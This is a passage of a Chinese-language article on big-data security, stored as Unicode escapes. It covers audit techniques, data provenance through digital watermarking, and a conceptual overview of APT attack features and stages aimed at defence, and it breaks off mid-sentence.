\u57fa\u4e8e\u7f51\u5173\u7684\u5ba1\u8ba1\u6280\u672f\u901a\u8fc7\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u5728\u90e8\u7f72\u7f51\u5173\u8bbe\u5907\uff0c\u5728\u7ebf\u622a\u83b7\u5e76\u8f6c\u53d1\u5230\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u6d41\u91cf\u800c\u5b9e\u73b0\u5ba1\u8ba1\uff0c\u5176\u5178\u578b\u90e8\u7f72\u793a\u610f\u5982\u4e0b\u56fe\u6240\u793a\uff1a 04.01.04 \u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f \u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f\u662f\u901a\u8fc7\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u4e2d\u5b89\u88c5\u76f8\u5e94\u7684\u5ba1\u8ba1Agent\uff08\u4ee3\u7406\uff09\uff0c\u5728Agent\u4e0a\u5b9e\u73b0\u5ba1\u8ba1\u7b56\u7565\u7684\u914d\u7f6e\u548c\u65e5\u5fd7\u7684\u91c7\u96c6\uff0c\u8be5\u6280\u672f\u4e0e\u65e5\u5fd7\u5ba1\u8ba1\u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662f\u9700\u8981\u5728\u88ab\u5ba1\u8ba1\u4e3b\u673a\u4e0a\u5b89\u88c5\u4ee3\u7406\u7a0b\u5e8f\u3002\u4ee3\u7406\u5ba1\u8ba1\u6280\u672f\u4ece\u5ba1\u8ba1\u7c92\u5ea6\u4e0a\u8981\u4f18\u4e8e\u65e5\u5fd7\u5ba1\u8ba1\u6280\u672f\u3002\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u5b58\u50a8\u4e8e\u591a\u79cd\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\uff0c\u9700\u8981\u540c\u65f6\u5ba1\u8ba1\u591a\u79cd\u5b58\u50a8\u67b6\u6784\u7684\u6570\u636e\uff0c\u539f\u5b58\u50a8\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u3001\u53ef\u9760\u6027\u3001\u6027\u80fd\u6216\u591a\u6216\u5c11\u90fd\u4f1a\u6709\u4e00\u4e9b\u5f71\u54cd\uff0c\u56e0\u6b64\u57fa\u4e8e\u4ee3\u7406\u7684\u5ba1\u8ba1\u6280\u672f\u5b9e\u9645\u7684\u5e94\u7528\u9762\u8f83\u7a84\u3002 \u901a\u8fc7\u5bf9\u6bd4\u4ee5\u4e0a4\u79cd\u6280\u672f\u7684\u5206\u6790\uff0c\u5728\u8fdb\u884c\u5927\u6570\u636e\u8f93\u51fa\u5b89\u5168\u5ba1\u8ba1\u6280\u672f\u65b9\u6848\u7684\u9009\u62e9\u65f6\uff0c\u9700\u8981\u4ece\u7a33\u5b9a\u6027\u3001\u53ef\u9760\u6027\u3001\u53ef\u7528\u6027\u7b49\u591a\u65b9\u9762\u8fdb\u884c\u8003\u8651\uff0c\u7279\u522b\u662f\u6280\u672f\u65b9\u6848\u7684\u9009\u62e9\u4e0d\u5e94\u5bf9\u73b0\u6709\u7cfb\u7edf\u9020\u6210\u5f71\u54cd\uff0c\u53ef\u4ee5\u4f18\u5148\u9009\u7528\u7f51\u7edc\u76d1\u542c\u5ba1\u8ba1\u6280\u672f\u6765\u5b9e\u73b0\u5bf9\u5927\u6570\u636e\u8f93\u51fa\u7684\u5b89\u5168\u5ba1\u8ba1\u3002 04.02 \u6570\u636e\u6eaf\u6e90 \u6570\u636e\u6eaf\u6e90\u662f\u4e00\u4e2a\u65b0\u5174\u7684\u7814\u7a76\u9886\u57df\uff0c\u8d77\u6e90\u4e8e20\u4e16\u7eaa90\u5e74\u4ee3\uff0c\u666e\u904d\u7406\u89e3\u4e3a\u8ffd\u8e2a\u6570\u636e\u7684\u8d77\u6e90\u548c\u91cd\u73b0\u6570\u636e\u7684\u5386\u53f2\u72b6\u6001\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u516c\u8ba4\u7684\u5b9a\u4e49\u3002\u5728\u5927\u6570\u636e\u5e94\u7528\u9886\u57df\uff0c\u6570\u636e\u6eaf\u6e90\u5c31\u662f\u5bf9\u5927\u6570\u636e\u5e94\u7528\u5468\u671f\u7684\u5404\u4e2a\u73af\u8282\u7684\u64cd\u4f5c\u8fdb\u884c\u6807\u8bb0\u548c\u5b9a\u4f4d\uff0c\u5728\u53d1\u751f\u6570\u636e\u5b89\u5168\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u53ca\u65f6\u51c6\u786e\u5730\u5b9a\u4f4d\u5230\u51fa\u73b0\u95ee\u9898\u7684\u73af\u8282\u548c\u8d23\u4efb\u8005\uff0c\u4ee5\u4fbf\u4e8e\u5bf9\u6570\u636e\u5b89\u5168\u95ee\u9898\u7684\u89e3\u51b3\u3002 \u76ee\u524d\u5b66\u672f\u754c\u5bf9\u6570\u636e\u6eaf\u6e90\u7684\u7406\u8bba\u7814\u7a76\u4e3b\u8981\u57fa\u4e8e\u6570\u636e\u96c6\u6eaf\u6e90\u7684\u6a21\u578b\u548c\u65b9\u6cd5\u5c55\u5f00\uff0c\u4e3b\u8981\u7684\u65b9\u6cd5\u6709\u6807\u6ce8\u6cd5\u548c\u53cd\u5411\u67e5\u8be2\u6cd5\uff0c\u8fd9\u4e9b\u9632\u8303\u90fd\u662f\u57fa\u4e8e\u5bf9\u6570\u636e\u64cd\u4f5c\u8bb0\u5f55\u7684\uff0c\u5bf9\u4e8e\u6076\u610f\u7a83\u53d6\u3001\u975e\u6cd5\u8bbf\u95ee\u8005\u6765\u8bf4\uff0c\u5f88\u5bb9\u6613\u7834\u574f\u6570\u636e\u6eaf\u6e90\u4fe1\u606f\uff0c\u5728\u5e94\u7528\u65b9\u9762\uff0c\u5305\u62ec\u6570\u636e\u5e93\u5e94\u7528\u3001\u5de5\u4f5c\u6d41\u5e94\u7528\u548c\u5176\u4ed6\u65b9\u9762\u7684\u5e94\u7528\uff0c\u76ee\u524d\u90fd\u5904\u5728\u7814\u7a76\u8282\u70b9\uff0c\u6ca1\u6709\u6210\u719f\u7684\u5e94\u7528\u6a21\u5f0f\u3002\u5927\u591a\u6570\u6eaf\u6e90\u7cfb\u7edf\u90fd\u662f\u5728\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\u5185\u90e8\u5b9e\u73b0\u6eaf\u6e90\u7ba1\u7406\uff0c\u6570\u636e\u5982\u4f55\u5728\u591a\u4e2a\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e4b\u95f4\u8f6c\u6362\u6216\u4f20\u64ad\uff0c\u6ca1\u6709\u7edf\u4e00\u7684\u4e1a\u754c\u6807\u51c6\uff0c\u968f\u7740\u4e91\u8ba1\u7b97\u548c\u5927\u6570\u636e\u73af\u5883\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u6570\u636e\u6eaf\u6e90\u95ee\u9898\u53d8\u5f97\u8d8a\u6765\u8d8a\u91cd\u8981\uff0c\u9010\u6e10\u6210\u4e3a\u7814\u7a76\u7684\u70ed\u70b9\u3002 04.02.01 \u5c06\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u6570\u5b57\u6c34\u5370\u6280\u672f\u7528\u4e8e\u6eaf\u6e90 \u6570\u5b57\u6c34\u5370\u662f\u5c06\u4e00\u4e9b\u6807\u8bc6\u4fe1\u606f\uff08\u5373\u6570\u5b57\u6c34\u5370\uff09\u76f4\u63a5\u5d4c\u5165\u6570\u5b57\u8f7d\u4f53\uff08\u5305\u62ec\uff1a\u591a\u5a92\u4f53\u3001\u6587\u6863\u3001\u8f6f\u4ef6\uff09\u4e2d\uff0c\u4f46\u4e0d\u5f71\u54cd\u539f\u8f7d\u4f53\u7684\u4f7f\u7528\u4ef7\u503c\uff0c\u4e5f\u4e0d\u5bb9\u6613\u88ab\u4eba\u7684\u77e5\u89c9\u7cfb\u7edf\uff08\u5982\uff1a\u89c6\u89c9\u6216\u542c\u89c9\u7cfb\u7edf\uff09\u89c9\u5bdf\u6216\u6ce8\u610f\u5230\u3002\u901a\u8fc7\u8fd9\u4e9b\u9690\u85cf\u5728\u8f7d\u4f53\u4e2d\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8fbe\u5230\u786e\u8ba4\u5185\u5bb9\u521b\u5efa\u8005\u3001\u8d2d\u4e70\u8005\u3001\u4f20\u9001\u9690\u79d8\u4fe1\u606f\u6216\u8005\u5224\u65ad\u8f7d\u4f53\u662f\u5426\u88ab\u7be1\u6539\u7684\u76ee\u7684\u3002\u6570\u5b57\u6c34\u5370\u7684\u4e3b\u8981\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u4e0d\u53ef\u611f\u77e5\u6027\uff1a\u4e5f\u5305\u62ec\u89c6\u89c9\u4e0a\u7684\u4e0d\u53ef\u89c1\u6027\u548c\u6c34\u5370\u7b97\u6cd5\u7684\u4e0d\u53ef\u63a8\u65ad\u6027\u3002 \u5f3a\u58ee\u6027\uff1a\u5d4c\u5165\u6c34\u5370\u96be\u4ee5\u88ab\u4e00\u822c\u7b97\u6cd5\u6e05\u9664\uff0c\u62b5\u6297\u5404\u79cd\u5bf9\u6570\u636e\u7684\u7834\u574f\u3002 \u53ef\u8bc1\u660e\u6027\uff1a\u5bf9\u5d4c\u5165\u6c34\u5370\u4fe1\u606f\u7684\u56fe\u50cf\uff0c\u53ef\u4ee5\u901a\u8fc7\u6c34\u5370\u68c0\u6d4b\u5668\u8bc1\u660e\u5d4c\u5165\u6c34\u5370\u7684\u5b58\u5728\u3002 \u81ea\u6062\u590d\u6027\uff1a\u542b\u6709\u6c34\u5370\u7684\u56fe\u50cf\u5728\u7ecf\u53d7\u4e00\u7cfb\u5217\u653b\u51fb\u540e\uff0c\u6c34\u5370\u4fe1\u606f\u4e5f\u7ecf\u8fc7\u4e86\u5404\u79cd\u64cd\u4f5c\u6216\u53d8\u6362\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u4e00\u5b9a\u7684\u7b97\u6cd5\u4ece\u5269\u4f59\u7684\u56fe\u50cf\u7247\u6bb5\u4e2d\u6062\u590d\u51fa\u6c34\u5370\u4fe1\u606f\uff0c\u800c\u4e0d\u9700\u8981\u6574\u6539\u539f\u59cb\u56fe\u50cf\u7684\u7279\u5f81\u3002 \u5b89\u5168\u4fdd\u5bc6\u6027\uff1a\u7761\u59ff\u6c34\u5370\u7cfb\u7edf\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2a\u5bc6\u94a5\u4ee5\u786e\u4fdd\u5b89\u5168\uff0c\u9632\u6b62\u4fee\u6539\u548c\u64e6\u9664\u3002 \u6570\u5b57\u6c34\u5370\u5229\u7528\u6570\u636e\u9690\u85cf\u539f\u7406\u4f7f\u6c34\u5370\u6807\u5fd7\u4e0d\u53ef\u89c1\uff0c\u65e2\u4e0d\u635f\u5bb3\u539f\u6570\u636e\uff0c\u53c8\u8fbe\u5230\u4e86\u5bf9\u6570\u636e\u8fdb\u884c\u6807\u8bb0\u7684\u76ee\u7684\u3002\u5229\u7528\u8fd9\u79cd\u9690\u85cf\u6807\u8bc6\u7684\u65b9\u6cd5\uff0c\u6807\u8bc6\u4fe1\u606f\u5728\u539f\u59cb\u6570\u636e\u4e0a\u662f\u770b\u4e0d\u5230\uff0c\u53ea\u6709\u901a\u8fc7\u7279\u6b8a\u7684\u9605\u8bfb\u7a0b\u5e8f\u624d\u53ef\u4ee5\u8bfb\u53d6\uff0c\u57fa\u4e8e\u6570\u5b57\u6c34\u5370\u7684\u7be1\u6539\u63d0\u793a\u662f\u89e3\u51b3\u6570\u636e\u7be1\u6539\u95ee\u9898\u7684\u7406\u60f3\u6280\u672f\u9014\u5f84\u3002 \u57fa\u4e8e\u6570\u5b57\u6c34\u5370\u6280\u672f\u7684\u4ee5\u4e0a\u6027\u8d28\uff0c\u53ef\u4ee5\u5c06\u6570\u5b57\u6c34\u5370\u5f15\u5165\u5927\u6570\u636e\u5e94\u7528\u9886\u57df\uff0c\u89e3\u51b3\u6570\u636e\u6eaf\u6e90\u95ee\u9898\u3002\u5728\u6570\u636e\u53d1\u5e03\u51fa\u53e3\uff0c\u53ef\u4ee5\u5efa\u7acb\u6570\u5b57\u6c34\u5370\u52a0\u8f7d\u673a\u5236\uff0c\u5728\u8fdb\u884c\u6570\u636e\u53d1\u5e03\u65f6\uff0c\u9488\u5bf9\u91cd\u8981\u6570\u636e\uff0c\u4e3a\u6bcf\u4e2a\u8bbf\u95ee\u8005\u83b7\u5f97\u7684\u6570\u636e\u52a0\u8f7d\u552f\u4e00\u7684\u6570\u5b57\u6c34\u5370\u3002\u5f53\u53d1\u751f\u673a\u5bc6\u6cc4\u9732\u6216\u9690\u79c1\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6c34\u5370\u63d0\u53d6\u7684\u65b9\u5f0f\uff0c\u68c0\u67e5\u53d1\u751f\u95ee\u9898\u7684\u6570\u636e\u662f\u53d1\u5e03\u7ed9\u54ea\u4e2a\u6570\u636e\u8bbf\u95ee\u8005\u7684\uff0c\u4ece\u800c\u786e\u5b9a\u6570\u636e\u6cc4\u9732\u7684\u6e90\u5934\uff0c\u53ca\u65f6\u8fdb\u884c\u5904\u7406\u3002 05 \u9632\u8303APT\u653b\u51fb 05.01 APT\u653b\u51fb\u7684\u6982\u5ff5 \u7f8e\u56fd\u56fd\u5bb6\u6807\u51c6\u6280\u672f\u7814\u7a76\u6240\uff08NIST\uff09\u5bf9APT\u7684\u5b9a\u4e49\u4e3a\uff1a\u653b\u51fb\u88c5\u638c\u63e1\u5148\u8fdb\u7684\u4e13\u4e1a\u77e5\u8bc6\u548c\u6709\u6548\u7684\u8d44\u6e90\uff0c\u901a\u8fc7\u591a\u79cd\u653b\u51fb\u9014\u5f84\uff08\u5982\uff1a\u7f51\u7edc\u3001\u7269\u7406\u8bbe\u65bd\u548c\u6b3a\u9a97\u7b49\uff09\uff0c\u5728\u7279\u5b9a\u7ec4\u7ec7\u7684\u4fe1\u606f\u6280\u672f\u57fa\u7840\u8bbe\u65bd\u5efa\u7acb\u5e76\u8f6c\u79fb\u7acb\u8db3\u70b9\uff0c\u4ee5\u7a83\u53d6\u673a\u5bc6\u4fe1\u606f\uff0c\u7834\u574f\u6216\u963b\u788d\u4efb\u52a1\u3001\u7a0b\u5e8f\u6216\u7ec4\u7ec7\u7684\u5173\u952e\u7cfb\u7edf\uff0c\u6216\u8005\u9a7b\u7559\u5728\u7ec4\u7ec7\u5185\u90e8\u7f51\u7edc\uff0c\u8fdb\u884c\u540e\u7eed\u653b\u51fb\u3002 APT\u653b\u51fb\u7684\u539f\u7406\u76f8\u5bf9\u5176\u4ed6\u653b\u51fb\u5f62\u5f0f\u66f4\u4e3a\u9ad8\u7ea7\u548c\u5148\u8fdb\uff0c\u5176\u9ad8\u7ea7\u6027\u4e3b\u8981\u4f53\u73b0\u5728APT\u5728\u53d1\u52a8\u653b\u51fb\u4e4b\u524d\u9700\u8981\u5bf9\u653b\u51fb\u5bf9\u8c61\u7684\u4e1a\u52a1\u6d41\u7a0b\u548c\u76ee\u6807\u7cfb\u7edf\u8fdb\u884c\u7cbe\u786e\u7684\u6536\u96c6\uff0c\u5728\u6536\u96c6\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6b64\u653b\u51fb\u4f1a\u4e3b\u52a8\u6316\u6398\u88ab\u653b\u51fb\u5bf9\u8c61\u53d7\u4fe1\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u57fa\u7840\u4e0a\u5f62\u6210\u653b\u51fb\u8005\u6240\u9700\u7684\u547d\u4ee4\u4e0e\u653b\u51fb\uff08C C\uff09\u7f51\u7edc\uff0c\u6b64\u79cd\u884c\u4e3a\u6ca1\u6709\u91c7\u53d6\u4efb\u4f55\u53ef\u80fd\u89e6\u53d1\u8b66\u62a5\u6216\u8005\u5f15\u8d77\u6000\u7591\u7684\u884c\u52a8\uff0c\u56e0\u6b64\u66f4\u63a5\u8fd1\u4e8e\u878d\u5165\u88ab\u653b\u51fb\u8005\u7684\u7cfb\u7edf\u3002 \u5927\u6570\u636e\u5e94\u7528\u73af\u5883\u4e0b\uff0cAPT\u653b\u51fb\u7684\u5b89\u5168\u5a01\u80c1\u66f4\u52a0\u51f8\u663e\u3002\u9996\u5148\uff0c\u5927\u6570\u636e\u5e94\u7528\u5bf9\u6570\u636e\u8fdb\u884c\u4e86\u903b\u8f91\u6216\u7269\u7406\u4e0a\u7684\u96c6\u4e2d\uff0c\u76f8\u5bf9\u4e8e\u4ece\u5206\u6563\u7684\u7cfb\u7edf\u4e2d\u6536\u96c6\u6709\u7528\u7684\u4fe1\u606f\uff0c\u96c6\u4e2d\u7684\u6570\u636e\u7cfb\u7edf\u4e3aAPT\u653b\u51fb\u6536\u96c6\u4fe1\u606f\u63d0\u4f9b\u4e86\"\u4fbf\u5229\"\uff1b\u5176\u6b21\uff0c\u6570\u636e\u6316\u6398\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u6709\u591a\u65b9\u5408\u4f5c\u7684\u4e1a\u52a1\u6a21\u5f0f\uff0c\u5916\u90e8\u7cfb\u7edf\u5bf9\u6570\u636e\u7684\u8bbf\u95ee\u589e\u52a0\u4e86\u9632\u6b62\u673a\u5bc6\u3001\u9690\u79c1\u51fa\u73b0\u6cc4\u6f0f\u7684\u9014\u5f84\u3002\u56e0\u6b64\uff0c\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u5bf9APT\u653b\u51fb\u7684\u68c0\u6d4b\u4e0e\u9632\u8303\uff0c\u662f\u5fc5\u987b\u8981\u8003\u8651\u7684\u95ee\u9898\u3002\u63a5\u4e0b\u6765\u5728\u5206\u6790APT\u653b\u51fb\u7279\u5f81\u4e0e\u6d41\u7a0b\u7684\u57fa\u7840\u4e0a\uff0c\u7814\u7a76APT\u653b\u51fb\u68c0\u6d4b\u65b9\u6cd5\u548c\u9632\u8303\u7b56\u7565\u3002 05.02 APT\u653b\u51fb\u7279\u5f81 APT\u653b\u51fb\u7279\u5f81\u5982\u4e0b\uff1a 05.02.01 \u6781\u5f3a\u7684\u9690\u853d\u6027 APT\u653b\u51fb\u4e0e\u88ab\u653b\u51fb\u5bf9\u8c61\u7684\u53ef\u4fe1\u7a0b\u5e8f\u6f0f\u6d1e\u4e0e\u4e1a\u52a1\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4e86\u878d\u5408\uff0c\u5728\u7ec4\u7ec7\u5185\u90e8\uff0c\u8fd9\u6837\u7684\u878d\u5408\u5f88\u96be\u88ab\u53d1\u73b0\u3002 05.02.02 \u6f5c\u4f0f\u671f\u957f\u3001\u6301\u7eed\u6027\u5f3a APT\u653b\u51fb\u662f\u4e00\u79cd\u5f88\u6709\u8010\u5fc3\u7684\u653b\u51fb\u5f62\u5f0f\uff0c\u653b\u51fb\u548c\u5a01\u80c1\u53ef\u80fd\u5728\u7528\u6237\u73af\u5883\u5b58\u5728\u4e86\u4e00\u5e74\u4ee5\u4e0a\uff0c\u4ed6\u4eec\u4e0d\u65ad\u6536\u96c6\u7528\u6237\u4fe1\u606f\uff0c\u76f4\u5230\u6536\u96c6\u5230\u91cd\u8981\u60c5\u62a5\u3002\u4ed6\u4eec\u5f80\u5f80\u4e0d\u662f\u4e3a\u4e86\u5728\u77ed\u65f6\u95f4\u5185\u83b7\u5229\uff0c\u800c\u662f\u628a\"\u88ab\u63a7\u4e3b\u673a\"\u5f53\u6210\u8df3\u677f\uff0c\u6301\u7eed\u641c\u7d22\uff0c\u76f4\u5230\u5145\u5206\u638c\u63e1\u4e86\u76ee\u6807\u5bf9\u8c61\u7684\u4f7f\u7528\u884c\u4e3a\u3002\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u6a21\u5f0f\uff0c\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\"\u6076\u610f\u5546\u4e1a\u95f4\u8c0d\u5a01\u80c1\"\uff1b\u56e0\u6b64\u5177\u6709\u5f88\u957f\u7684\u6f5c\u4f0f\u671f\u548c\u6301\u7eed\u6027\u3002 05.02.03 \u76ee\u6807\u6027\u5f3a \u4e0d\u540c\u4e8e\u4ee5\u5f80\u7684\u5e38\u89c4\u75c5\u6bd2\uff0cAPT\u5236\u4f5c\u8005\u638c\u63e1\u9ad8\u7ea7\u6f0f\u6d1e\u53d1\u6398\u548c\u8d85\u5f3a\u7684\u7f51\u7edc\u653b\u51fb\u6280\u672f\u3002\u53d1\u8d77APT\u653b\u51fb\u6240\u9700\u7684\u6280\u672f\u58c1\u5792\u548c\u8d44\u6e90\u58c1\u5792\uff0c\u8981\u8fdc\u9ad8\u4e8e\u666e\u901a\u653b\u51fb\u884c\u4e3a\u3002\u5176\u9488\u5bf9\u7684\u653b\u51fb\u76ee\u6807\u4e5f\u4e0d\u662f\u666e\u901a\u4e2a\u4eba\u7528\u6237\uff0c\u800c\u662f\u62e5\u6709\u9ad8\u4ef7\u503c\u654f\u611f\u6570\u636e\u7684\u9ad8\u7ea7\u7528\u6237\uff0c\u7279\u522b\u662f\u53ef\u80fd\u5f71\u54cd\u5230\u56fd\u5bb6\u548c\u5730\u533a\u653f\u6cbb\u3001\u5916\u4ea4\u3001\u91d1\u878d\u7a33\u5b9a\u7684\u9ad8\u7ea7\u522b\u654f\u611f\u6570\u636e\u6301\u6709\u8005\u3002 05.02.04 \u6280\u672f\u9ad8\u7ea7 \u653b\u51fb\u8005\u638c\u63e1\u5148\u8fdb\u7684\u653b\u51fb\u6280\u672f\uff0c\u4f7f\u7528\u591a\u79cd\u653b\u51fb\u9014\u5f84\uff0c\u5305\u62ec\u8d2d\u4e70\u6216\u81ea\u5df1\u5f00\u53d1\u76840day\u6f0f\u6d1e\uff0c\u800c\u4e00\u822c\u653b\u51fb\u8005\u5374\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e9b\u8d44\u6e90\u3002\u800c\u4e14\u653b\u51fb\u8fc7\u7a0b\u590d\u6742\uff0c\u653b\u51fb\u6301\u7eed\u8fc7\u7a0b\u5728\u653b\u51fb\u8005\u80fd\u591f\u52a8\u6001\u8c03\u6574\u653b\u51fb\u65b9\u5f0f\uff0c\u4ece\u6574\u4f53\u4e0a\u638c\u63e1\u653b\u51fb\u8fdb\u7a0b\u3002 05.02.05 \u5a01\u80c1\u6027\u5927 APT\u653b\u51fb\u901a\u5e38\u62e5\u6709\u96c4\u539a\u7684\u8d44\u91d1\u652f\u6301\uff0c\u7531\u7ecf\u9a8c\u4e30\u5bcc\u7684\u9ed1\u5ba2\u56e2\u961f\u53d1\u8d77\uff0c\u4e00\u822c\u4ee5\u7834\u574f\u56fd\u5bb6\u6216\u5927\u578b\u4f01\u4e1a\u7684\u5173\u952e\u57fa\u7840\u8bbe\u65bd\u4e3a\u76ee\u6807\uff0c\u7a83\u53d6\u5185\u90e8\u6838\u5fc3\u673a\u5bc6\u4fe1\u606f\uff0c\u5371\u53ca\u56fd\u5bb6\u5b89\u5168\u548c\u793e\u4f1a\u7a33\u5b9a\u3002 05.03 APT\u653b\u51fb\u7684\u4e00\u822c\u6d41\u7a0b APT\u653b\u51fb\u7684\u6d41\u7a0b\u4e00\u822c\u5305\u62ec\u5982\u4e0b\u6b65\u9aa4\uff1a 05.03.01 \u4fe1\u606f\u4fa6\u67e5 \u5728\u5165\u4fb5\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u9996\u5148\u4f1a\u4f7f\u7528\u6280\u672f\u548c\u793e\u4f1a\u5de5\u7a0b\u5b66\u624b\u6bb5\u5bf9\u7279\u5b9a\u76ee\u6807\u8fdb\u884c\u4fa6\u67e5\u3002\u4fa6\u67e5\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4e24\u4e2a\u65b9\u9762\uff1a\u4e00\u662f\u5bf9\u76ee\u6807\u7f51\u7edc\u7528\u6237\u7684\u4fe1\u606f\u6536\u96c6\uff0c\u4f8b\u5982\uff1a\u9ad8\u5c42\u9886\u5bfc\u3001\u7cfb\u7edf\u7ba1\u7406\u5458\u6216\u8005\u666e\u901a\u804c\u5458\u7b49\u5458\u5de5\u8d44\u6599\u3001\u7cfb\u7edf\u7ba1\u7406\u5236\u5ea6\u3001\u7cfb\u7edf\u4e1a\u52a1\u6d41\u7a0b\u548c\u4f7f\u7528\u60c5\u51b5\u7b49\u4fe1\u606f\uff1b\u4e8c\u662f\u5bf9\u76ee\u6807\u7f51\u7edc\u8106\u5f31\u70b9\u7684\u4fe1\u606f\u6536\u96c6\uff0c\u4f8b\u5982\uff1a\u8f6f\u4ef6\u7248\u672c\u3001\u5f00\u653e\u7aef\u53e3\u7b49\u3002\u968f\u540e\uff0c\u653b\u51fb\u8005\u9488\u5bf9\u76ee\u6807\u7cfb\u7edf\u7684\u8106\u5f31\u70b9\uff0c\u7814\u7a760day\u6f0f\u6d1e\u3001\u5b9a\u5236\u6728\u9a6c\u7a0b\u5e8f\u3001\u5236\u5b9a\u653b\u51fb\u8ba1\u5212\uff0c\u7528\u4e8e\u5728\u4e0b\u4e00\u9636\u6bb5\u5b9e\u65bd\u7cbe\u786e\u653b\u51fb\u3002 05.03.02 \u6301\u7eed\u6e17\u900f \u5229\u7528\u76ee\u6807\u4eba\u5458\u7684\u758f\u5ffd\u3001\u4e0d\u6267\u884c\u5b89\u5168\u89c4\u8303\uff0c\u4ee5\u53ca\u5229\u7528\u7cfb\u7edf\u5e94\u7528\u7a0b\u5e8f\u3001\u7f51\u7edc\u670d\u52a1\u6216\u4e3b\u673a\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u5b9a\u5236\u6728\u9a6c\u7b49\u624b\u6bb5\uff0c\u4e0d\u65ad\u6e17\u900f\u4ee5\u6f5c\u4f0f\u5728\u76ee\u6807\u7cfb\u7edf\uff0c\u8fdb\u4e00\u6b65\u5730\u5728\u907f\u514d\u7528\u6237\u89c9\u5bdf\u7684\u6761\u4ef6\u4e0b\u53d6\u5f97\u7f51\u7edc\u6838\u5fc3\u8bbe\u5907\u7684\u63a7\u5236\u6743\u3002\u4f8b\u5982\uff1a\u901a\u8fc7SQL\u6ce8\u5165\u7b49\u653b\u51fb\u624b\u6bb5\u7a81\u7834\u9762\u5411\u5916\u7f51\u7684Web\u670d\u52a1\u5668\uff0c\u6216\u901a\u8fc7\u9493\u9c7c\u653b\u51fb\uff0c\u53d1\u9001\u6b3a\u8bc8\u90ae\u4ef6\u83b7\u53d6\u5185\u7f51\u7528\u6237\u901a\u4fe1\u8bb0\u5f55\uff0c\u5e76\u8fdb\u4e00\u6b65\u5165\u4fb5\u9ad8\u7ba1\u4e3b\u673a\uff0c\u91c7\u7528\u53d1\u9001\u5e26\u6f0f\u6d1e\u7684Office\u6587\u4ef6\u8bf1\u9a97\u7528\u6237\u5c06\u6b63\u5e38\u7f51\u5740\u8bf7\u6c42\u91cd\u5b9a\u5411\u6076\u610f\u7ad9\u70b9\u3002 05.03.03 \u957f\u671f\u6f5c\u4f0f \u4e3a\u4e86\u83b7\u53d6\u6709\u4ef7\u503c\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u4e00\u822c\u4f1a\u5728\u76ee\u6807\u7f51\u7edc\u957f\u671f\u6f5c\u4f0f\uff0c\u6709\u7684\u8fbe\u6570\u5e74\u4e4b\u4e45\u3002\u6f5c\u4f0f\u671f\u95f4\uff0c\u653b\u51fb\u8005\u8fd8\u4f1a\u5728\u5df2\u63a7\u5236\u7684\u4e3b\u673a\u4e0a\u5b89\u88c5\u5404\u79cd\u6728\u9a6c\u3001\u540e\u95e8\uff0c\u4e0d\u65ad\u63d0\u9ad8\u6076\u610f\u8f6f\u4ef6\u7684\u590d\u6742\u5ea6\u3002\u4ee5\u589e\u52a0\u653b\u51fb\u80fd\u529b\u5e76\u907f\u5f00\u5b89\u5168\u68c0\u6d4b\u3002 05.03.04 \u7a83\u53d6\u4fe1\u606f \u76ee\u524d\u7edd\u5927\u90e8\u5206APT\u653b\u51fb\u7684\u76ee\u6807\u90fd\u662f\u7a83\u53d6\u76ee\u6807\u7ec4\u7ec7\u7684\u673a\u5bc6\u4fe1\u606f\u3002\u653b\u51fb\u8005\u4e00\u822c\u91c7\u7528SSL VPN\u8fde\u63a5\u7684\u65b9\u5f0f\u63a7\u5236\u5185\u7f51\u4e3b\u673a\uff0c\u5bf9\u4e8e\u7a83\u53d6\u5230\u7684\u673a\u5bc6\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5c06\u5176\u52a0\u5bc6\u5b58\u653e\u5728\u7279\u5b9a\u4e3b\u673a\u4e0a\uff0c\u518d\u9009\u62e9\u5408\u9002\u7684\u65f6\u95f4\u5c06\u5176\u901a\u8fc7\u9690\u79d8\u4fe1\u9053\u4f20\u8f93\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u670d\u52a1\u5668\u3002\u7531\u4e8e\u6570\u636e\u4ee5\u5bc6\u6587\u65b9\u5f0f\u5b58\u5728\uff0cAPT\u7a0b\u5e8f\u5728\u83b7\u53d6\u91cd\u8981\u6570\u636e\u540e\u5411\u5916\u90e8\u53d1\u9001\u65f6\uff0c\u5229\u7528\u4e86\u5408\u6cd5\u6570\u636e\u7684\u4f20\u8f93\u901a\u9053\u548c\u52a0\u5bc6\u3001\u538b\u7f29\u65b9\u5f0f\uff0c\u96be\u4ee5\u8fa8\